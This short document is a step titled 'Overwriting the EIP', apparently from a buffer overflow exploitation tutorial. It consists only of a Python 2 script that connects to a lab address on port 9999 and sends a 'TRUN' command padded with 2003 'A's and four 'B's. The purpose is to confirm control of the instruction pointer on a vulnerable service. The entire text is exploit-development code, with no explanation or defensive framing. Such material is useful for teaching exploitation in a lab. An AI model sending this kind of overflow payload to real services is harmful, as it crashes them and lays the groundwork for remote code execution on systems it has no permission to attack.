4-Overwriting the EIP

~~~python
#!/usr/bin/python
import sys, socket

verifyeip = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.253.129",9999))
	s.send(('TRUN /.:/' + verifyeip))
	s.close()

except:
	print "Error Connecting to Server..."
	sys.exit()
~~~

